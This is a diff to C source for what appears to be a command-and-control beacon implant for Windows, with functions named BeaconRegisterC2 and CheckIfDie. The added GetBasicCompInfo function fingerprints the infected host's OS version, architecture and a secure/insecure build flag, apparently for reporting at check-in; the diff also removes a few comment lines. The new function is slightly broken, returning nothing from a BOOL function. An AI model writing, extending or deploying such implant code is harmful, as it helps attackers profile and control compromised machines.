@@ -7,6 +7,7 @@
 #include <lm.h>
 #include <winhttp.h>
 #include <stdio.h>
+#include <versionhelpers.h>
 
 // so we can parse the json data
 
@@ -62,6 +63,69 @@ BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
     UserInfo->ComputerName = ComputerBuf;
 
     return TRUE;
+}
+
+BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo)
+{
+    OSVERSIONINFOEXW osInfo;
+	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
+
+    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");
+
+    RtlGetVersion(&osInfo);
+
+    if (sizeof(void*) == 8)
+        CompInfo->Arch = "x64";
+    if (sizeof(void*) == 4)
+        CompInfo->Arch = "x86";
+
+    #ifdef SECURE
+        CompInfo->Secure = "SECURE";
+    #endif
+
+    #ifndef SECURE
+        CompInfo->Secure = "INSECURE";
+    #endif
+
+    if ((osInfo.dwMajorVersion == 10) && (osInfo.wProductType == VER_NT_WORKSTATION))
+    {
+        CompInfo->OS = "Windows 10";
+        return;
+    }
+    if ((osInfo.dwMajorVersion == 10) && (osInfo.wProductType != VER_NT_WORKSTATION))
+    {
+        if (IsWindowsVersionOrGreater(osInfo.dwMajorVersion, 0, 1803))
+        {
+            CompInfo->OS = "Windows Server 2019";
+            return;
+        } else {
+            CompInfo->OS = "Windows Server 2016";
+            return;
+        }
+    }
+    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 3) && (osInfo.wProductType == VER_NT_WORKSTATION))
+    {
+        CompInfo->OS = "Windows 8.1";
+        return;
+    }
+    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 3) && (osInfo.wProductType != VER_NT_WORKSTATION))
+    {
+        CompInfo->OS = "Windows Server 2012 R2";
+        return;
+    }
+    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 2) && (osInfo.wProductType == VER_NT_WORKSTATION))
+    {
+        CompInfo->OS = "Windows 8";
+        return;
+    }
+    if ((osInfo.dwMajorVersion == 6) && (osInfo.dwMinorVersion == 2) && (osInfo.wProductType != VER_NT_WORKSTATION))
+    {
+        CompInfo->OS = "Windows Server 2012";
+        return;
+    }
+    
+    CompInfo->OS = "Windows";
+
 }
 
 LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
@@ -191,10 +255,6 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         
     }
     printf("after loops\n");
-    
-    // clean up the buffer so its parseable
-
-    // ReadBuffer[57] = '\0';
 
     // clean up the request stuffs now we are done with it.
 
